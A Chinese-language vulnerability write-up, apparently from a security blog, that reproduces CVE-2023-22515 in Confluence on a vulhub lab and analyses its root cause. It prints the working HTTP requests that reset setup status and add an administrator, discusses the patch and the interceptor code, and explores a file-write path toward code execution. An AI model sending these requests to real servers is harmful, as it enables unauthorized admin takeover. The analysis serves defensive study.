<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="18679f73e864c4acc104f2c0772f3664">简介</h2>
<p>2023年10月4日，Atlassian官方发布了对于CVE-2023-22515漏洞的补丁。这个漏洞是由属性覆盖导致，利用该漏洞攻击者可以重新执行Confluence安装流程并增加管理员账户。</p>
<p>该漏洞不影响8.0.0以前的版本。</p>
<p>影响版本</p>
<p>Confluence Data Center 和 Confluence Server</p>
<ul>
<li>8.0.0 - - 8.0.4</li>
<li>8.1.0 - - 8.1.4</li>
<li>8.2.0 - - 8.2.3</li>
<li>8.3.0 - - 8.3.2</li>
<li>8.4.0 - - 8.4.2</li>
<li>8.5.0 - - 8.5.1</li>
</ul>
<h2 data-content="1" id="26da381f7a696b9e488da6adcf24a0ae">漏洞复现</h2>
<p>使用vulhub的漏洞环境</p>
<p><a href="https://github.com/vulhub/vulhub/blob/master/confluence/CVE-2023-22515/README.zh-cn.md" target="_blank">https://github.com/vulhub/vulhub/blob/master/confluence/CVE-2023-22515/README.zh-cn.md</a></p>
<p>0x01 覆盖 <code>bootstrapStatusProvider.applicationConfig.setupComplete</code>属性</p>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">localhost:8090</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US;q=0.9,en;q=0.8</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110153704-f19c6f38-7f9b-1.png"/></p>
<p>0x02 添加管理员请求包</p>
<p>请求后正常会302跳转</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/setup/setupadministrator.action</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">localhost:8090</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US;q=0.9,en;q=0.8</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">110</span>
<span class="na">X-Atlassian-Token</span><span class="o">:</span> <span class="l">no-check</span>

username=vulhub&amp;fullName=vulhub&amp;email=admin%40vulhub.org&amp;password=vulhub&amp;confirm=vulhub&amp;setup-next-button=Next
</pre></div>
<p>response</p>
<div class="highlight"><pre><span></span><span class="err">HTTP/1.1 302 </span>
<span class="err">Cache-Control: no-store</span>
<span class="err">Expires: Thu, 01 Jan 1970 00:00:00 GMT</span>
<span class="err">X-Confluence-Request-Time: 1698332831817</span>
<span class="err">X-XSS-Protection: 1; mode=block</span>
<span class="err">X-Content-Type-Options: nosniff</span>
<span class="err">X-Frame-Options: SAMEORIGIN</span>
<span class="err">Content-Security-Policy: frame-ancestors 'self'</span>
<span class="err">Set-Cookie: JSESSIONID=1E428B7ED069E414E71DCE1824419A91; Path=/; HttpOnly</span>
<span class="err">Set-Cookie: seraph.confluence=425986%3A2718a7a9244706dd728e51b3df100e9bbc26c242; Max-Age=1209600; Expires=Thu, 09 Nov 2023 15:07:12 GMT; Path=/; HttpOnly</span>
<span class="err">Location: /setup/finishsetup.action</span>
<span class="err">Content-Type: text/html;charset=UTF-8</span>
<span class="err">Content-Language: en-US</span>
<span class="err">Content-Length: 0</span>
<span class="err">Date: Thu, 26 Oct 2023 15:07:12 GMT</span>
<span class="err">Connection: close</span>
</pre></div>
<p>0x03 send 302跳转包即可添加成功</p>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/setup/finishsetup.action</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">localhost:8090</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US;q=0.9,en;q=0.8</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
<span class="na">X-Atlassian-Token</span><span class="o">:</span> <span class="l">no-check</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">http://172.16.4.1:8090/setup/setupadministrator.action</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110153751-0d923362-7f9c-1.png"/></p>
<h2 data-content="1" id="8b1e30d6719c2e11ebc8130dbcb52de4">漏洞分析</h2>
<p>漏洞原因是：</p>
<blockquote>
<p>XWork allows the setting of complex parameters on an XWork action object. For example, a URL parameter of formData.name=Charles will be translated by XWork into the method calls getFormData().setName(“Charles”) by the XWork parameters interceptor. If getFormData() returns null, XWork will attempt to create a new object of the appropriate return type using its default constructor, and then set it with setFormData(newObject).<br/>
XWork 允许在 XWork 动作对象上设置复杂参数。例如，formData.name=Charles 的 URL 参数将由 XWork 转换为 XWork 参数拦截器的方法调用 getFormData（）.setName（“Charles”）。如果 getFormData（） 返回 null，XWork 将尝试使用其默认构造函数创建相应返回类型的新对象，然后使用 setFormData（newObject） 进行设置。</p>
<p>This leads to the potential for serious security vulnerabilities in XWork actions, as you can effectively call arbitrary methods on an Action object.<br/>
这会导致 XWork 操作中出现严重的安全漏洞，因为您可以有效地在 Action 对象上调用任意方法。</p>
</blockquote>
<p>diff</p>
<p>com.atlassian.struts2_struts-support-1.1.0.jar 和 com.atlassian.struts2_struts-support-1.2.0.jar</p>
<p>主要更改了SafeParametersInterceptor中的逻辑</p>
<p>查看配置该拦截器位于defaultStack</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;interceptor</span> <span class="na">name=</span><span class="s">"params"</span> <span class="na">class=</span><span class="s">"com.atlassian.xwork.interceptors.SafeParametersInterceptor"</span><span class="nt">/&gt;</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nt">&lt;interceptor-stack</span> <span class="na">name=</span><span class="s">"defaultStack"</span><span class="nt">&gt;</span>
              ...
              <span class="nt">&lt;interceptor-ref</span> <span class="na">name=</span><span class="s">"params"</span><span class="nt">/&gt;</span>
</pre></div>
<p>com.atlassian.confluence_confluence-8.5.1.jar 和 com.atlassian.confluence_confluence-8.5.2.jar：</p>
<ul>
<li>
<p>删除了<code>com.atlassian.confluence.core.actions.ServerInfoAction</code>和<code>com.atlassian.confluence.util.ServerInfoFilter</code></p>
</li>
<li>
<p>修改<code>com.atlassian.confluence.impl.setup.BootstrapStatusProviderImpl</code> setter</p>
</li>
</ul>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110153924-45469712-7f9c-1.png"/></p>
<p>并设置setter去抛出异常来保证为readonly</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110153955-57c2bb0a-7f9c-1.png"/></p>
<p>主要是针对漏洞复现中step1的修复</p>
<div class="highlight"><pre><span></span><span class="err">/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false</span>
</pre></div>
<p>删除了<code>/server-info.action</code>路由并限制了<code>bootstrapStatusProvider.applicationConfig.setupComplete</code>不可通过struts的机制调用setter来设置其为false来重新添加管理员</p>
<p>debug，断点下在改动很多的SafeParametersInterceptor</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110154127-8e7a0626-7f9c-1.png"/></p>
<p>retrieveParameters获取请求参数</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110154143-97b24528-7f9c-1.png"/></p>
<p>之后调用filterSafeParameters,对参数的安全性做过滤</p>
<p>isSafeParameterName方法中通过正则对一些危险的参数名做了过滤</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110154158-a0fd1644-7f9c-1.png"/></p>
<ul>
<li>
<code>BLOCKED_PARAMETER_NAMES</code> 参数名不能包含actionErrors和actionMessages</li>
<li><code>EXCLUDE_CLASS_PATTERN=".*class[^a-z0-9_].*"</code></li>
<li><code>SAFE_PARAMETER_NAME_PATTERN="\w+((\.\w+)|(\[\d+\])|(\['[\w.]*'\]))*"</code></li>
</ul>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110154213-a98af7cc-7f9c-1.png"/></p>
<p>之后调用<code>isSafeComplexParameterName(key, action)</code></p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">isSafeComplexParameterName</span><span class="o">(</span><span class="n">String</span> <span class="n">key</span><span class="o">,</span> <span class="n">Action</span> <span class="n">action</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">String</span> <span class="n">initialParameterName</span> <span class="o">=</span> <span class="n">extractInitialParameterName</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
            <span class="n">BeanInfo</span> <span class="n">info</span> <span class="o">=</span> <span class="n">Introspector</span><span class="o">.</span><span class="na">getBeanInfo</span><span class="o">(</span><span class="n">action</span><span class="o">.</span><span class="na">getClass</span><span class="o">());</span>
            <span class="n">PropertyDescriptor</span><span class="o">[]</span> <span class="n">descs</span> <span class="o">=</span> <span class="n">info</span><span class="o">.</span><span class="na">getPropertyDescriptors</span><span class="o">();</span>
            <span class="n">PropertyDescriptor</span><span class="o">[]</span> <span class="n">var5</span> <span class="o">=</span> <span class="n">descs</span><span class="o">;</span>
            <span class="kt">int</span> <span class="n">var6</span> <span class="o">=</span> <span class="n">descs</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>

            <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">var7</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">var7</span> <span class="o">&lt;</span> <span class="n">var6</span><span class="o">;</span> <span class="o">++</span><span class="n">var7</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">PropertyDescriptor</span> <span class="n">desc</span> <span class="o">=</span> <span class="n">var5</span><span class="o">[</span><span class="n">var7</span><span class="o">];</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">initialParameterName</span><span class="o">))</span> <span class="o">{</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">isSafeMethod</span><span class="o">(</span><span class="n">desc</span><span class="o">.</span><span class="na">getReadMethod</span><span class="o">()))</span> <span class="o">{</span>
                        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
                    <span class="o">}</span>

                    <span class="n">log</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="s">"Attempt to call unsafe property setter "</span> <span class="o">+</span> <span class="n">key</span> <span class="o">+</span> <span class="s">" on "</span> <span class="o">+</span> <span class="n">action</span><span class="o">);</span>
                    <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IntrospectionException</span> <span class="n">var9</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">log</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">"Error introspecting action parameter "</span> <span class="o">+</span> <span class="n">key</span> <span class="o">+</span> <span class="s">" for action "</span> <span class="o">+</span> <span class="n">action</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">var9</span><span class="o">.</span><span class="na">getMessage</span><span class="o">(),</span> <span class="n">var9</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
<p>现获取参数的第一个.之前的名称，例如a.b.c就是获取a，包含数组参数处理</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">extractInitialParameterName</span><span class="o">(</span><span class="n">String</span> <span class="n">key</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">return</span> <span class="n">key</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"["</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">key</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="s">"."</span><span class="o">)</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">key</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="s">"["</span><span class="o">)</span> <span class="o">&lt;=</span> <span class="n">key</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="s">"."</span><span class="o">))</span> <span class="o">?</span> <span class="n">key</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">key</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="s">"["</span><span class="o">))</span> <span class="o">:</span> <span class="n">key</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">key</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="s">"."</span><span class="o">));</span>
<span class="o">}</span>
</pre></div>
<p>之后获取当前请求的action的类信息去获取到包括父类中的所有的getter/ setter，之后拿属性名与a.b.c中的a做equals，</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110154230-b3a2980a-7f9c-1.png"/></p>
<p>如果存在该属性则之后调用isSafeMethod方法判断是否安全,需要setter有ParameterSafe注解或返回值类型有ParameterSafe注解才为true</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">isSafeMethod</span><span class="o">(</span><span class="n">Method</span> <span class="n">writeMethod</span><span class="o">)</span> <span class="o">{</span>
    <span class="kt">boolean</span> <span class="n">isAnnotationTrue</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
    <span class="kt">boolean</span> <span class="n">isReturnTypeTrue</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">writeMethod</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">isAnnotationTrue</span> <span class="o">=</span> <span class="n">writeMethod</span><span class="o">.</span><span class="na">getAnnotation</span><span class="o">(</span><span class="n">ParameterSafe</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="k">if</span> <span class="o">(</span><span class="n">writeMethod</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">isReturnTypeTrue</span> <span class="o">=</span> <span class="n">writeMethod</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">().</span><span class="na">getAnnotation</span><span class="o">(</span><span class="n">ParameterSafe</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="k">return</span> <span class="n">isAnnotationTrue</span> <span class="o">||</span> <span class="n">isReturnTypeTrue</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>以上，当这些检查都通过时才会把请求传递的参数被put到parameters中，乍一看其实过滤蛮严的</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110154249-bf66a776-7f9c-1.png"/></p>
<p>但是后续走完this.before逻辑走入下一个interceptor时调用了父类的doIntercept方法</p>
<p>com/opensymphony/xwork2/interceptor/ParametersInterceptor#doIntercept</p>
<p>在this.setParameters使用OGNL来调用setter/getter</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110154311-cc2f8874-7f9c-1.png"/></p>
<p>关于利用</p>
<p>这里的点就是利用Struts2中使用OGNL来调用getter / setter的特性</p>
<p>需要找一个Action类，该类或其父类存在的属性中存在的值可以被利用，或者setter中可以触发某些恶意操作</p>
<p>回看poc</p>
<div class="highlight"><pre><span></span><span class="err">/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false</span>
</pre></div>
<p>找了com.atlassian.confluence.core.actions.ServerInfoAction类</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;action</span> <span class="na">name=</span><span class="s">"server-info"</span> <span class="na">class=</span><span class="s">"com.atlassian.confluence.core.actions.ServerInfoAction"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"success"</span> <span class="na">type=</span><span class="s">"rawText"</span><span class="nt">&gt;</span>success<span class="nt">&lt;/result&gt;</span>
<span class="nt">&lt;/action&gt;</span>
</pre></div>
<p>继承了com/atlassian/confluence/core/ConfluenceActionSupport.class</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110154330-d7703e68-7f9c-1.png"/></p>
<p>其中有一个bootstrapStatusProvider属性，其存储的实现类是BootstrapStatusProviderImpl，之后调用getApplicationConfig方法获取<code>ApplicationConfig</code>对象，其中保存了setupComplete属性用于标识是否setUp完成，调用其setter改为false即可更改confluence的安装状态，进而重新添加管理员</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110154346-e14df5a6-7f9c-1.png"/></p>
<p>小结：</p>
<p>个人感觉问题在于SafeParametersInterceptor中处理后继续调用了父类struts2的ParametersInterceptor，导致了利用struts的特性，通过构造url访问action使得ognl调用恶意 getter/setter来覆盖原有属性导致的</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110154547-29393006-7f9d-1.png"/></p>
<h2 data-content="1" id="ab282a3c7f00bcf7f9660cb37523d5fa">RCE 方式</h2>
<p>可以通过后台添加plugin的方式完成rce</p>
<p>这里延展漏洞的思路，从<code>ConfluenceActionSupport</code>入手，观察是否有哪些恶意属性的setter可以利用</p>
<p>debug，观察属性，找了一通确实有个能写文件的点</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110154654-511f6da6-7f9d-1.png"/></p>
<p>先判断是否为空，为空设置默认值为<code>initial</code>，之后调用setter，赋值属性存储到applicationConfig对象内</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110154706-587b1bf4-7f9d-1.png"/></p>
<p>调用<code>this.saveApplicationConfig();</code></p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">void</span> <span class="nf">saveApplicationConfig</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">applicationConfig</span><span class="o">.</span><span class="na">save</span><span class="o">();</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ConfigurationException</span> <span class="n">var2</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">log</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">"Error writing state to confluence.cfg.xml"</span><span class="o">,</span> <span class="n">var2</span><span class="o">);</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></div>
<p>最终调用ApplicationConfig#save</p>
<p>前面设置了几个配置的值，后面调用了<code>this.configurationPersister.save(this.getApplicationHome(), this.getConfigurationFileName());</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110154726-64340f82-7f9d-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231110154739-6bd4c7e0-7f9d-1.png"/></p>
<p>最终调用saveDocumentTo，使用XMLWriter写入文件</p>
<p>而观察堆栈可以看出docker环境默认是<code>/var/atlassian/application-data/confluence/confluence.cfg.xml</code></p>
<p>但是&lt;&gt;会在进入拦截器时被转义,使用编码等方式时解析jsp会出问题，并且vulhub docker环境默认web目录还没有权限写。</p>
<h2 data-content="1" id="c6787ac09ab333dc90ca393683802c2b">Reference</h2>
<p><a href="https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html" target="_blank">https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html</a></p>
<p><a href="https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2023-22515" target="_blank">https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2023-22515</a></p>
<p><a href="https://mp.weixin.qq.com/s/rIfYrO1i4LPpgCGyxSLHUg" target="_blank">https://mp.weixin.qq.com/s/rIfYrO1i4LPpgCGyxSLHUg</a></p>
</div>
</div>